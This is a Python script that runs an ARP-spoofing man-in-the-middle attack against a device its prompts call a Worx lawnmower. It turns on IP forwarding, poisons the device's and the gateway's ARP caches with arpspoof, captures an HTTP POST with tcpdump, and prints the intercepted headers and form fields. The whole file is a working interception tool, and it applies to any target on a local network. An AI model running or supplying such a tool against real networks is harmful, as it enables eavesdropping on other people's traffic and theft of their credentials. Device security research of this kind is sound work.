import os
import time
import subprocess
from threading import Thread

def arpspoof():
	command = "sudo arpspoof -i {} -t {} -r {}".format(interface, worx_ip, default_gateway)
	subprocess.call(['sudo', 'xterm', '-fa', 'ds', '-fs', '9', '-geometry', '70x28', '-T', '\'ARP SPOOF\'', '-fg', 'cyan', '-e', command])

t1 = Thread(target=arpspoof)

while True:
	interface = input("interface: ")
	default_gateway = input("Default gateway: ")
	worx_ip = input("IP of worx lawnmower: ")
	pcap_save_name = input("File save name (not file extention): ")
	pcap_save_name += ".pcap"
	save_pcap = input("Wanna save pcap file (y/n):")
	
	print("\n"*100)

	print("Interface: {}".format(interface))
	print("Default gateway: {}".format(default_gateway))
	print("IP of lawnmower: {}".format(worx_ip))
	print("File name: {}\n".format(pcap_save_name))

	if input("Is this correct (y/n): ") == "n":
		continue
	else:
		break

print("It sould return 1")
os.system("sudo echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
time.sleep(3)
print("[+] starting arp-spoof")
t1.start()
time.sleep(1)

got_packet = False

while not got_packet:
	print("[+] Waiting for packet")
	sharkcommand = "sudo tcpdump -i {} -c 1 -w {} -s 0 -A 'src {} and tcp dst port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'".format(interface, pcap_save_name, worx_ip)
	subprocess.call(['sudo', 'xterm', '-fa', 'ds', '-fs', '9', '-geometry', '70x28', '-T', '\'PACKET CATCHER\'', '-fg', 'white', '-e', sharkcommand])
	print("[+] Got a packet")
	print("[+] Reading from packetdump....")
	
	os.system("tcpdump -qns 0 -A -r {} > packetdump.txt".format(pcap_save_name))
	if save_pcap.lower() == "n":
		time.sleep(2)
		os.system("rm {}".format(pcap_save_name))
	
	file_data = open("packetdump.txt", 'r')
	i = 0
	for line in file_data:
		if i < 4:
			if line[0:4].lower() == "host" or line[0:10].lower() == "connection" or line[0:7].lower() == "content":
				print(line)
				i+=1
		else:
			split_line = line.split('&')
			for data in split_line:
				data = data.split("=")
				data = " ".join(data)
				data = data.replace(" ", ":  ", 1)

				print("{}".format(data))
		
	got_packet = True
	time.sleep(3)
print("=====-DONE-=====")
